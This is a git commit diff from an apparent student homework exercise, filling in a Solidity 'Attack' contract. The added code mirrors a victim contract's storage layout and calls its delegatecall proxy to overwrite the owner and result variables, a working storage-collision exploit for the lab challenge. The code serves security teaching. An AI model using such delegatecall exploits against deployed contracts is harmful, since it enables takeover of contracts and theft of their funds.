ddbcd434e1519da0a029de075825e5b934cfa51e
ooyang0325 <diego930325@gmail.com>
2024-03-21 01:45:49 +0800

    BREAKING CHANGE: finished all problems

--- hw1/src/Delegation/Delegation.sol
+++ hw1/src/Delegation/Delegation.sol
@@ -10,16 +10,28 @@ contract Attack {
     address internal immutable victim;
     // TODO: Declare some variable here
     // Note: Checkout the storage layout in victim contract
+    uint256 var0 = 12345;
+    uint8 var1 = 32;
+    string private var2;
+    address private var3;
+    uint8 private var4;
+    address public owner;
+    mapping(address => bool) public result;
 
     constructor(address addr) payable {
         victim = addr;
     }
 
     // NOTE: You might need some malicious function here
+    function changeResult(address sender) public {
+        owner = sender;
+        result[sender] = true;
+    }
 
     function exploit() external {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
+        ID31eg4t3(victim).proxyCall(abi.encodeWithSignature("changeResult(address)", msg.sender));
     }
 }
